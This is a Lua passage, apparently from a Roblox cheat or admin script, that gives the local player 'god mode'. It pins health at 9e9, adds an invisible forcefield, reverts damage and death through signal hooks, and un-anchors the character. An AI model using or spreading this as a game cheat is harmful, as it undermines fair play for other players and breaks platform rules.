local GodMode = { active = false, connections = {} }

local function enableGodMode()
    if GodMode.active then return end
    GodMode.active = true
    
    local function apply()
        local char = LP.Character
        if not char then return end
        
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        
        hum.MaxHealth = 9e9
        hum.Health = 9e9
        hum.BreakJointsOnDeath = false
        
        local ff = Instance.new("ForceField")
        ff.Visible = false
        ff.Parent = char
        
        local conn1 = hum:GetPropertyChangedSignal("Health"):Connect(function()
            if GodMode.active and hum and hum.Parent and hum.Health < 9e9 then
                hum.Health = 9e9
            end
        end)
        table.insert(GodMode.connections, conn1)
        
        local conn2 = hum:GetPropertyChangedSignal("MaxHealth"):Connect(function()
            if GodMode.active and hum then
                hum.MaxHealth = 9e9
            end
        end)
        table.insert(GodMode.connections, conn2)
        
        local conn3 = char.ChildRemoved:Connect(function(child)
            if GodMode.active and child:IsA("ForceField") then
                local newFF = Instance.new("ForceField")
                newFF.Visible = false
                newFF.Parent = char
            end
        end)
        table.insert(GodMode.connections, conn3)
        
        local conn4 = hum.Died:Connect(function()
            if GodMode.active then
                task.wait(0.1)
                if hum and hum.Parent then
                    hum.Health = 9e9
                end
            end
        end)
        table.insert(GodMode.connections, conn4)
        
        local conn5 = RS.Heartbeat:Connect(function()
            if GodMode.active then
                local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                if h and h ~= hum then
                    task.spawn(apply)
                    return
                end
                if h and h.Health < 9e9 then
                    h.Health = 9e9
                end
            end
        end)
        table.insert(GodMode.connections, conn5)
        
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            local conn6 = root:GetPropertyChangedSignal("Anchored"):Connect(function()
                if GodMode.active and root.Anchored then
                    root.Anchored = false
                end
            end)
            table.insert(GodMode.connections, conn6)
        end
    end
    
    apply()
end

local function disableGodMode()
    GodMode.active = false
    for _, conn in ipairs(GodMode.connections) do
        pcall(function() conn:Disconnect() end)
    end
    GodMode.connections = {}
    
    local char = LP.Character
    if char then
        local ff = char:FindFirstChildOfClass("ForceField")
        if ff then ff:Destroy() end
        
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.MaxHealth = 100
            hum.Health = 100
        end
    end
end

